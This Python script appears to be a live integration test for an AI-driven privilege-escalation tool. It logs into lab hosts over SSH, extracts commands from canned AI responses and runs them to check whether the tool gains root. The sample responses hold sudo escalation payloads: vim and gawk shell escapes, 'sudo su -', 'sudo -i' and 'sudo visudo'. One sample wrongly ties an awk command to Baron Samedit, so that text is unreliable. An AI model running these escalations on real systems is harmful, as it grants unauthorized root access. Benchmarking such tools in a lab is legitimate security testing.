#!/usr/bin/env python3
"""Live integration check: Upgraded Session v2 on Does-it-work? benchmark targets."""

from __future__ import annotations

import os
import subprocess
import sys
import time
from dataclasses import dataclass
from typing import List, Tuple

os.environ.setdefault("PWNLIB_NOTERM", "1")

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from pwn import context, ssh

context.log_level = "error"

from ramigpt.domain.root_detection import diagnose_root
from ramigpt.session_v2 import execute_command, process_ai_response
from ramigpt.session_v2.types import ShellBridge
from ramigpt.web.app import (  # noqa: E402 — reuse PTY helpers
    _ai_sleep,
    _answer_password_prompt,
    _interrupt_shell,
    _is_shell_prompt_line,
    _looks_like_editor_stuck,
    _looks_like_password_prompt,
    _safe_decode,
    _still_waiting_on_password,
    _try_quit_editor,
    recv_for_duration,
    shell_recvuntil_v4,
)

HOST = os.environ.get("BENCH_HOST", "10.10.1.109")
USER = os.environ.get("BENCH_USER", "lowpriv")
PASSWORD = os.environ.get("BENCH_PASS", "password")
CHECKS_DIR = os.path.join(ROOT, "scripts", "benchmark", "checks")


@dataclass(frozen=True)
class Target:
    target_id: str
    port: int
    hostname: str
    verify_script: str


@dataclass(frozen=True)
class Scenario:
    label: str
    ai_response: str


TARGETS: List[Target] = [
    Target("sudo-vim", 2211, "bench-vim", "sudo-vim.sh"),
    Target("sudo-awk", 2212, "bench-awk", "sudo-awk.sh"),
    Target("sudo-all", 2170, "bench-sudo-all", "sudo-all.sh"),
]

SCENARIOS: dict[str, List[Scenario]] = {
    "sudo-vim": [
        Scenario(
            "prose + visudo (benchmark failure replay)",
            (
                "The next command should target the identified vulnerability with sudo and "
                "attempt to escalate privileges by modifying the sudoers file using the allowed editor.\n\n"
                "**Command**:\n"
                "`sudo visudo`\n\n"
                "This command invokes the graphical editor (vim) via sudo."
            ),
        ),
        Scenario(
            "fenced vim GTFOBin",
            (
                "Use GTFOBins vim escape.\n\n"
                "```bash\nsudo /usr/bin/vim -c ':!id' -c ':q!' /dev/null\n```"
            ),
        ),
    ],
    "sudo-awk": [
        Scenario(
            "prose + malformed awk (benchmark failure replay)",
            (
                "To escalate privileges using the identified vulnerability where 'lowpriv' can run "
                "'/usr/bin/awk' via sudo without a password, the following command attempts to "
                "exploit the Baron Samedit issue.\n\n"
                "**Command:**\n"
                "sudo awk -f /dev/null '/./{print(\"UID=\",$1); system(sprintf(\"/bin/sh\",))};'\n"
            ),
        ),
        Scenario(
            "fenced gawk shell drop",
            (
                "BeRoot suggested this GTFOBin.\n\n"
                "```bash\nsudo gawk 'BEGIN {system(\"/bin/sh\")}'\n```"
            ),
        ),
    ],
    "sudo-all": [
        Scenario(
            "prose + sudo su - (benchmark failure replay)",
            (
                "The next command to execute is to gain root access using sudo since it's available "
                "with NOPASSWORD.\n\n"
                "**Command:**\n"
                "```bash\nsudo su -\n```\n\n"
                "This command uses sudo to run an interactive shell as root."
            ),
        ),
        Scenario(
            "fenced sudo -i",
            (
                "Gain a root shell.\n\n"
                "```bash\nsudo -i\n```\n\n"
                "Leverages NOPASSWD ALL."
            ),
        ),
    ],
}


def _bridge() -> ShellBridge:
    return ShellBridge(
        recv_until_v4=shell_recvuntil_v4,
        interrupt_shell=_interrupt_shell,
        is_prompt_line=_is_shell_prompt_line,
        looks_like_editor_stuck=_looks_like_editor_stuck,
        try_quit_editor=_try_quit_editor,
        looks_like_password_prompt=_looks_like_password_prompt,
        still_waiting_on_password=_still_waiting_on_password,
        answer_password_prompt=_answer_password_prompt,
        recv_for_duration=recv_for_duration,
        safe_decode=_safe_decode,
        sleep=_ai_sleep,
    )


def _open_shell(port: int):
    conn = ssh(host=HOST, port=port, user=USER, password=PASSWORD, ignore_config=True)
    shell = None
    for starter in ("/bin/sh", "/bin/bash", "sh", "bash"):
        try:
            shell = conn.process(starter)
            break
        except Exception:
            continue
    if shell is None:
        raise RuntimeError("Could not open interactive shell")
    shell.sendline("")
    time.sleep(0.5)
    recv_for_duration(shell, 1.0)
    return conn, shell


def _run_verify(target: Target) -> Tuple[bool, str]:
    env = os.environ.copy()
    env.update(
        {
            "BENCH_HOST": HOST,
            "BENCH_PORT": str(target.port),
            "BENCH_PASS": PASSWORD,
        }
    )
    script = os.path.join(CHECKS_DIR, target.verify_script)
    proc = subprocess.run(
        ["bash", script],
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )
    output = (proc.stdout or "") + (proc.stderr or "")
    return proc.returncode == 0, output.strip()


def _run_case(target: Target, scenario: Scenario) -> bool:
    command = process_ai_response(scenario.ai_response)
    print(f"\n=== {target.target_id} / {scenario.label} ===")
    print(f"extracted command: {command!r}")

    conn, shell = _open_shell(target.port)
    try:
        result = execute_command(
            shell,
            command or "",
            bridge=_bridge(),
            hostname=target.hostname,
            password=PASSWORD,
            timeout=15.0,
        )
        print(f"notes: {', '.join(result.notes)}")
        print(f"needs_reconnect: {result.needs_reconnect}")
        print(f"got_root (driver): {result.got_root}")
        tail = (result.shell_output or "")[-500:]
        print(f"output tail:\n{tail}")
        diag = diagnose_root(target.hostname, result.shell_output or "")
        print(f"diagnose_root: {diag.get('got_root')} ({diag.get('reason')})")
        return bool(result.got_root or diag.get("got_root"))
    finally:
        try:
            shell.close()
        except Exception:
            pass
        try:
            conn.close()
        except Exception:
            pass


def main() -> int:
    print(f"Lab host: {USER}@{HOST}")
    results: List[Tuple[str, str, bool]] = []

    print("\n######## verify scripts ########")
    for target in TARGETS:
        ok, output = _run_verify(target)
        status = "PASS" if ok else "FAIL"
        print(f"[{status}] {target.target_id} ({target.verify_script}): {output.splitlines()[0] if output else 'no output'}")
        results.append((target.target_id, f"verify/{target.verify_script}", ok))

    print("\n######## session v2 live ########")
    for target in TARGETS:
        for scenario in SCENARIOS[target.target_id]:
            ok = _run_case(target, scenario)
            results.append((target.target_id, scenario.label, ok))

    print("\n######## summary ########")
    failed = 0
    for target_id, label, ok in results:
        status = "PASS" if ok else "FAIL"
        print(f"[{status}] {target_id} — {label}")
        if not ok:
            failed += 1

    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
